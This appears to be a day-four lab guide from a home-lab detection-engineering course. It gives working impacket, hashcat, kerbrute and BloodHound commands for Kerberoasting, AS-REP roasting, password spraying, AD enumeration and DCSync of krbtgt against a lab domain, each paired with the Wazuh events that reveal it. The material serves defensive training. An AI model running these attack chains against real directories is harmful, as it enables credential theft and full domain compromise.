# Day 4 — Thursday: Run 5 AD Attacks

**Goal:** Execute 5 attack chains, capture telemetry, screenshot evidence. This is the data your detection rules will be built from on the weekend.

**Time budget:** 4–5 hours.

**Mindset:** You are NOT building stealthy attacks. You ARE building **demonstrable** attacks where you can clearly correlate "I ran X command" with "Wazuh saw Y events." Loud and obvious is good for now.

---

## Pre-flight (15 min)

### Snapshot everything

In Proxmox:
- DC01 → snapshot `pre-attack-day`
- WS01 → snapshot `pre-attack-day`
- Wazuh SIEM → snapshot `pre-attack-day`

This is your nuclear rollback button. Use it freely between attacks.

### Set up Kali

Kali can run on:
- Your laptop (fastest if you already have it)
- A Proxmox VM on **vmbr1** (more realistic, but you'll need to build it)
- WSL2 (works for most attacks)

Recommended: **Kali VM on vmbr1, 4GB RAM, 2 cores, 60GB disk**. Bridge to vmbr1 only.

Required tools (install once):
```bash
sudo apt update
sudo apt install -y impacket-scripts crackmapexec bloodhound.py kerbrute hashcat git python3-pip
pip3 install impacket
# Get Rubeus and SharpHound for Windows-side execution
git clone https://github.com/GhostPack/Rubeus.git
git clone https://github.com/BloodHoundAD/SharpHound.git
```

For Windows-side BloodHound collection, you'll copy `SharpHound.exe` (or use `bloodhound.py` from Kali — easier).

### Open Wazuh dashboard, ready to capture

In your browser:
- Wazuh **Threat Hunting → Events** view
- Time range: "Last 15 minutes"
- Refresh interval: 30 seconds
- One window for DC01 events (filter: `agent.name : dc01`), one for WS01

---

## Attack 1 — Kerberoasting (T1558.003)

**What it does:** Request service tickets for SPN-enabled accounts, extract the encrypted hash, crack offline. The two service accounts you created on Day 2 (`svc_mssql`, `svc_iis`) are the targets.

### Execute

From Kali:
```bash
# Get a TGT for any domain user (use one from create-lab-users.ps1)
# Then request service tickets for all SPN accounts
impacket-GetUserSPNs lab.local/jsmith:'Summer2024!' \
    -dc-ip 10.10.10.10 \
    -request \
    -outputfile kerberoast-hashes.txt

cat kerberoast-hashes.txt
```

### Crack

```bash
# Use rockyou.txt (built into Kali at /usr/share/wordlists/rockyou.txt.gz)
gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
hashcat -m 13100 kerberoast-hashes.txt /usr/share/wordlists/rockyou.txt --force
```

You should crack at least one ticket (the passwords are intentionally weak).

### Expected telemetry

In Wazuh, search for:
- `data.win.system.eventID : "4769"` AND `data.win.eventdata.ticketEncryptionType : "0x17"`
- 0x17 = RC4-HMAC = Kerberoasting indicator

### Document

Create `attack-1-kerberoasting.md` in this folder with:
- Command run (above)
- Time of execution
- Cracked passwords (yes, even though it's a lab)
- Screenshot: Wazuh showing Event ID 4769 with RC4 encryption
- Mapped MITRE technique: T1558.003

---

## Attack 2 — AS-REP Roasting (T1558.004)

**What it does:** Find users with "Do not require Kerberos preauthentication" (you set this on `j.legacy`), request their AS-REP, crack offline.

### Execute

```bash
impacket-GetNPUsers lab.local/ \
    -dc-ip 10.10.10.10 \
    -usersfile <(echo "j.legacy") \
    -no-pass \
    -format hashcat \
    -outputfile asrep-hashes.txt

cat asrep-hashes.txt

# Crack
hashcat -m 18200 asrep-hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Expected telemetry

- `data.win.system.eventID : "4768"` AND `data.win.eventdata.preAuthType : "0"`
- preAuthType=0 = no preauth = AS-REP roasting

### Document

`attack-2-asrep.md` with same structure as Attack 1. MITRE technique: **T1558.004**.

---

## Attack 3 — Password Spray (T1110.003)

**What it does:** Try ONE common password against MANY accounts. Avoids account lockout while finding weak passwords.

### Execute

Create a userlist:
```bash
cat > users.txt <<EOF
jsmith
sjohnson
mwilliams
ebrown
djones
jgarcia
dmiller
adavis
jrodriguez
amartinez
chernandez
llopez
mgonzalez
rwilson
kanderson
EOF
```

Spray:
```bash
kerbrute passwordspray -d lab.local --dc 10.10.10.10 users.txt 'Password1!'
```

You should get at least one hit (Michael Williams has this password).

### Expected telemetry

Many `4625` (failed logon) events from a single source within a short window:
- Search: `data.win.system.eventID : "4625"`
- The detection signal is RATE — many failures from one source IP across many usernames

### Document

`attack-3-passwordspray.md`. MITRE technique: **T1110.003**.

---

## Attack 4 — BloodHound Collection (T1087, T1069, T1018)

**What it does:** Enumerate the entire AD environment — users, groups, ACLs, sessions, group memberships. Visualize attack paths.

### Execute

From Kali:
```bash
# Collect AD data using the Python collector
bloodhound-python -d lab.local \
    -u jsmith -p 'Summer2024!' \
    -ns 10.10.10.10 \
    -c All

# This produces several .json files in current directory
ls -la *.json
```

### Visualize

```bash
# Start Neo4j (if not running)
sudo neo4j start

# Start BloodHound GUI
bloodhound &
```

In BloodHound:
1. Drag the .json files into the upload area
2. Pre-built queries → "Find Shortest Paths to Domain Admins"
3. **Screenshot the attack path graph** — this is gold for your portfolio

### Expected telemetry

LDAP queries from WS01/Kali to DC01:
- Sysmon Event ID 3 (network connections) on DC01 from your Kali IP to port 389
- Many 4662 events (object access) on DC01

### Document

`attack-4-bloodhound.md`. Include the attack path screenshot. MITRE techniques: **T1087.002, T1069.002, T1018**.

---

## Attack 5 — DCSync (T1003.006)

**What it does:** Abuse replication permissions to extract password hashes for ANY account, including `krbtgt` (the holy grail — lets you make Golden Tickets later).

You already gave `cdavis` Domain Admin rights on Day 2, so this is a privilege escalation chain you'd execute *after* compromising that account.

### Execute

From Kali, using `cdavis` credentials:
```bash
impacket-secretsdump lab.local/cdavis:'Welcome123'@10.10.10.10 \
    -just-dc-user krbtgt
```

You should get the `krbtgt` NTLM and Kerberos hashes — full domain compromise.

### Expected telemetry

- `data.win.system.eventID : "4662"` on DC01
- The `objectName` field contains replication GUIDs:
  - `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes)
  - `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes-All)

### Document

`attack-5-dcsync.md`. MITRE technique: **T1003.006**.

---

## End-of-day checklist

- [ ] All 5 attacks executed successfully
- [ ] At least 3 screenshots per attack (command, cracked output if applicable, Wazuh telemetry)
- [ ] One markdown writeup per attack in this folder
- [ ] Wazuh saw events for ALL 5 attacks (even if it didn't ALERT — that's what Days 6-7 fix)
- [ ] Snapshots `post-attack-1` through `post-attack-5` taken (optional but nice for re-running)
- [ ] Lab journal updated

---

## What if Wazuh didn't see anything?

This is common on Day 4 — Wazuh sees the events but its default ruleset doesn't ALERT on them. Days 6-7 fix that.

To verify Wazuh is at least *receiving* the events (not alerting, just receiving):

In Discover/Threat Hunting:
- `agent.name : "dc01" AND data.win.system.eventID : "4769"` — should show events
- If you see them: ✅ logging works, Days 6-7 will write rules to alert
- If you don't: ❌ check Sysmon eventchannel config from Day 3, restart agent

---

## Common pitfalls

| Problem | Cause | Fix |
|---------|-------|-----|
| Kali can't reach DC01 | Wrong subnet | Verify Kali on vmbr1 with 10.10.10.x address |
| `GetUserSPNs.py` returns 0 results | SPN not set | Re-run create-lab-users.ps1, verify with `Get-ADUser ... -Filter * -Properties ServicePrincipalNames` |
| AS-REP returns nothing | Preauth not disabled | `Get-ADUser j.legacy -Properties DoesNotRequirePreAuth` should show True |
| BloodHound collector errors | Time skew | `sudo ntpdate dc01.lab.local` on Kali |
| DCSync "access denied" | cdavis not in Domain Admins | Run `Add-ADGroupMember "Domain Admins" cdavis` again |
| Hashcat says "no devices" | Use `--force` or install OpenCL | `--force` is fine for lab purposes |
